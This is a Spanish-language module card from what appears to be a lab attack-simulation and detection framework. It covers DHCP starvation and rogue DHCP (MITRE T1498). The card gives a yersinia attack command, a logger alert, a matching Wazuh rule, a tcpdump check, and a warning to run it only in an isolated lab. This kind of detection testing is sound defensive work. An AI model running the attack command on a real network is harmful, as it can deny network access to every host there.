# MOD06 — DHCP Starvation / Rogue DHCP
ID: LAN-006 | MITRE: T1498 | Wazuh Rule: 100505 | Risk: CRITICAL

## Comando (INMUTABLE)
sudo yersinia dhcp -G -i {{interface}}

## Parámetros
| name      | type | default | required |
|-----------|------|---------|----------|
| interface | text | eth0    | true     |

## Logger (INMUTABLE)
logger -t CyberShield -p local0.alert "SEC_VIOLATION: DHCP Starvation/Rogue server detected on {{interface}} - MITRE:T1498"

## Regla Wazuh (INMUTABLE)
<rule id="100505" level="12">
  <if_sid>1002</if_sid>
  <match>SEC_VIOLATION: DHCP Starvation</match>
  <description>ALERTA CYBERSHIELD: Agotamiento de pool DHCP y servidor falso detectado</description>
  <mitre><id>T1498</id></mitre>
</rule>

## Nota crítica
PELIGROSO en red real. Solo ejecutar en laboratorio Proxmox aislado.
Puede derribar toda la infraestructura de red corporativa.

## Verificación en Kali (ejecutar en paralelo al ataque)
```bash
sudo tcpdump -i eth0 port 67 or port 68 -nn 2>/dev/null | head -10
```